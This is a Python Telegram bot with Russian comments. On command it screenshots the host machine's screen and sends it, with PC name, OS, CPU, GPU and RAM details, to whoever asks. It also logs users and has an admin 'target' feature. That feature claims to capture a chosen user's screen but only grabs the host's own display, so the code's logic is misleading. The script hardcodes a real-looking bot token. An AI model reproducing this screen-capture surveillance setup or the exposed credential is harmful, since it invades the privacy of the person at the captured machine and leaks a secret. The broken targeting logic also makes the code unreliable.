import json
import os
import platform
import subprocess
from datetime import datetime
from PIL import ImageGrab
import psutil
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Конфигурация
TOKEN = "7247434031:AAGEoy4khlG5EMUU0l0gQtBkTkk5Pl2uubY"
DATA_FILE = "user_data.json"
SCREENSHOT_DIR = "screenshots"
TARGETS_FILE = "targets.json"

# Создаём необходимые директории и файлы
os.makedirs(SCREENSHOT_DIR, exist_ok=True)


class TargetManager:
    @staticmethod
    def load_targets():
        try:
            with open(TARGETS_FILE, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    @staticmethod
    def save_targets(targets):
        with open(TARGETS_FILE, "w") as f:
            json.dump(targets, f, indent=4)

    @staticmethod
    def add_target(admin_id, target_id):
        targets = TargetManager.load_targets()
        targets[str(admin_id)] = str(target_id)
        TargetManager.save_targets(targets)

    @staticmethod
    def remove_target(admin_id):
        targets = TargetManager.load_targets()
        if str(admin_id) in targets:
            del targets[str(admin_id)]
            TargetManager.save_targets(targets)
            return True
        return False

    @staticmethod
    def get_target(admin_id):
        targets = TargetManager.load_targets()
        return targets.get(str(admin_id))


class UserDataManager:
    @staticmethod
    def load_data():
        try:
            with open(DATA_FILE, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    @staticmethod
    def save_data(data):
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=4)

    @staticmethod
    def update_user_data(user_id, username, system_info):
        data = UserDataManager.load_data()
        user_id_str = str(user_id)

        if user_id_str not in data:
            data[user_id_str] = {
                "username": username,
                "first_seen": datetime.now().isoformat(),
                "request_count": 0,
                "system_info": {},
                "history": []
            }

        data[user_id_str]["request_count"] += 1
        data[user_id_str]["last_seen"] = datetime.now().isoformat()
        data[user_id_str]["system_info"] = system_info
        data[user_id_str]["history"].append({
            "timestamp": datetime.now().isoformat(),
            "system_info": system_info
        })

        UserDataManager.save_data(data)
        return data[user_id_str]


def get_gpu_info():
    """Альтернативные методы получения информации о GPU"""
    try:
        result = subprocess.run(['nvidia-smi', '--query-gpu=name', '--format=csv,noheader'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            return result.stdout.strip().split('\n')[0]

        if platform.system() == "Windows":
            import wmi
            w = wmi.WMI()
            for gpu in w.Win32_VideoController():
                return gpu.Name
    except:
        pass

    return "Не удалось определить"


def get_system_info():
    ram = psutil.virtual_memory()
    ram_total = ram.total / (1024 ** 3)
    ram_available = ram.available / (1024 ** 3)

    return {
        "pc_name": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": platform.processor(),
        "gpu": get_gpu_info(),
        "ram_total": f"{ram_total:.1f} GB",
        "ram_available": f"{ram_available:.1f} GB"
    }


async def send_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        screenshot_path = os.path.join(SCREENSHOT_DIR,
                                       f"screenshot_{update.effective_user.id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        ImageGrab.grab().save(screenshot_path, "PNG")

        system_info = get_system_info()
        message = (
            "🖥️ <b>Системная информация</b> 🖥️\n\n"
            f"🔍 <b>Имя ПК:</b> {system_info['pc_name']}\n"
            f"🏷️ <b>ОС:</b> {system_info['os']}\n"
            f"⚙️ <b>Процессор:</b> {system_info['cpu']}\n"
            f"🎮 <b>Видеокарта:</b> {system_info['gpu']}\n"
            f"🧠 <b>ОЗУ:</b> {system_info['ram_total']} (Доступно: {system_info['ram_available']})\n"
            f"⏰ <b>Время запроса:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

        username = update.effective_user.username or update.effective_user.full_name
        UserDataManager.update_user_data(update.effective_user.id, username, system_info)

        with open(screenshot_path, "rb") as photo:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=photo,
                caption=message,
                parse_mode="HTML"
            )

        os.remove(screenshot_path)

    except Exception as e:
        await update.message.reply_text(f"⚠️ Ошибка: {str(e)}")


async def list_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        data = UserDataManager.load_data()
        if not data:
            await update.message.reply_text("📭 Нет данных о пользователях")
            return

        keyboard = []
        for user_id, user_data in data.items():
            btn_text = f"{user_data['username']} (ID: {user_id})" if user_data.get(
                'username') else f"Unknown (ID: {user_id})"
            keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"user_{user_id}")])

        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "👥 <b>Список пользователей:</b>",
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

    except Exception as e:
        await update.message.reply_text(f"⚠️ Ошибка: {str(e)}")


async def user_detail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.data.split("_")[1]
    data = UserDataManager.load_data()
    user_data = data.get(user_id)

    if not user_data:
        await query.edit_message_text("Пользователь не найден")
        return

    info = user_data["system_info"]
    message = (
        "🔍 <b>Детали пользователя</b> 🔍\n\n"
        f"👤 <b>Имя:</b> {user_data['username'] or 'Неизвестно'}\n"
        f"🆔 <b>ID:</b> {user_id}\n"
        f"📅 <b>Первый запрос:</b> {datetime.fromisoformat(user_data['first_seen']).strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"⏰ <b>Последний запрос:</b> {datetime.fromisoformat(user_data['last_seen']).strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🔢 <b>Всего запросов:</b> {user_data['request_count']}\n\n"
        "🖥️ <b>Системная информация:</b>\n"
        f"  • Имя ПК: {info['pc_name']}\n"
        f"  • ОС: {info['os']}\n"
        f"  • Процессор: {info['cpu']}\n"
        f"  • Видеокарта: {info['gpu']}\n"
        f"  • ОЗУ: {info['ram_total']} (Доступно: {info['ram_available']})"
    )

    await query.edit_message_text(text=message, parse_mode="HTML")


async def target_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message.reply_to_message:
            await update.message.reply_text("ℹ️ Нужно ответить на сообщение пользователя командой /target")
            return

        target_id = update.message.reply_to_message.from_user.id
        admin_id = update.effective_user.id

        TargetManager.add_target(admin_id, target_id)
        await update.message.reply_text(
            f"🎯 Теперь вы можете отправлять команду /screen для пользователя {target_id}\n"
            f"Чтобы отменить, используйте /untarget"
        )
    except Exception as e:
        await update.message.reply_text(f"⚠️ Ошибка в /target: {str(e)}")


async def untarget_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        admin_id = update.effective_user.id

        if TargetManager.remove_target(admin_id):
            await update.message.reply_text("🎯 Режим target отключён")
        else:
            await update.message.reply_text("ℹ️ Вы не находитесь в режиме target")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Ошибка в /untarget: {str(e)}")


async def screen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Повторяет функционал /send_data для выбранного пользователя"""
    try:
        admin_id = update.effective_user.id
        target_id = TargetManager.get_target(admin_id)

        if not target_id:
            await update.message.reply_text("ℹ️ Сначала выберите пользователя через /target")
            return

        # Делаем скриншот
        screenshot_path = os.path.join(SCREENSHOT_DIR,
                                       f"screenshot_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        ImageGrab.grab().save(screenshot_path, "PNG")

        # Получаем системные данные
        system_info = get_system_info()

        # Формируем сообщение (как в /send_data)
        message = (
            "🖥️ <b>Системная информация (по запросу админа)</b> 🖥️\n\n"
            f"🔍 <b>Имя ПК:</b> {system_info['pc_name']}\n"
            f"🏷️ <b>ОС:</b> {system_info['os']}\n"
            f"⚙️ <b>Процессор:</b> {system_info['cpu']}\n"
            f"🎮 <b>Видеокарта:</b> {system_info['gpu']}\n"
            f"🧠 <b>ОЗУ:</b> {system_info['ram_total']} (Доступно: {system_info['ram_available']})\n"
            f"⏰ <b>Время запроса:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

        # Отправляем скриншот и данные
        with open(screenshot_path, "rb") as photo:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=photo,
                caption=message,
                parse_mode="HTML"
            )

        # Обновляем данные пользователя (если он есть в базе)
        user_data = UserDataManager.load_data().get(str(target_id))
        if user_data:
            UserDataManager.update_user_data(int(target_id), user_data['username'], system_info)

        # Удаляем временный файл
        os.remove(screenshot_path)

    except Exception as e:
        await update.message.reply_text(f"⚠️ Ошибка в /screen: {str(e)}")


def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("send_data", send_data))
    application.add_handler(CommandHandler("list_check", list_check))
    application.add_handler(CommandHandler("target", target_user))
    application.add_handler(CommandHandler("untarget", untarget_user))
    application.add_handler(CommandHandler("screen", screen_command))
    application.add_handler(CallbackQueryHandler(user_detail, pattern="^user_"))

    application.run_polling()


if __name__ == "__main__":
    main()